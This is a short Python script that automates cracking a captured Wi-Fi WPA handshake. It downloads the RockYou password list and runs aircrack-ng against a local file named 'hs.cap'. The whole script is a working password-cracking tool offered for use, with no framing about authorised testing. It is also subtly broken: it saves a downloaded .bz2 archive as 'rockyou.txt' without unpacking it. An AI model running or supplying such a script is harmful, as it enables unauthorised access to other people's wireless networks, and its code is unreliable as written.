import os
import subprocess
import requests

# Function to download a file from a URL
def download_file(url, filename):
    if not os.path.exists(filename):
        print(f"Downloading {filename} from {url}...")
        response = requests.get(url)
        with open(filename, 'wb') as file:
            file.write(response.content)
        print(f"Downloaded {filename} to {os.path.abspath(filename)}")
    else:
        print(f"{filename} already exists.")

# Function to download the RockYou wordlist
def download_wordlist(url, filename):
    download_file(url, filename)

# Function to crack the handshake using aircrack-ng
def crack_handshake(cap_file, wordlist_file):
    print(f"Attempting to crack the handshake in {cap_file} using {wordlist_file}...")
    try:
        # Call aircrack-ng
        result = subprocess.run(['aircrack-ng', cap_file, '-w', wordlist_file], capture_output=True, text=True)
        print(result.stdout)  # Print the output of aircrack-ng
        if result.returncode == 0:
            print("Cracking completed successfully.")
        else:
            print("Cracking failed or no password found.")
    except Exception as e:
        print(f"An error occurred: {e}")

# Main function
def main():
    rockyou_url = "https://github.com/praetorian-inc/rockyou.txt/releases/download/rockyou.txt.bz2"  # URL to download RockYou
    wordlist_file = "rockyou.txt"
    
    # Use the local CAP file
    cap_file = "hs.cap"  # Ensure this file is in the same directory as the script

    # Download the wordlist
    download_wordlist(rockyou_url, wordlist_file)

    # Crack the handshake
    crack_handshake(cap_file, wordlist_file)

if __name__ == "__main__":
    main()
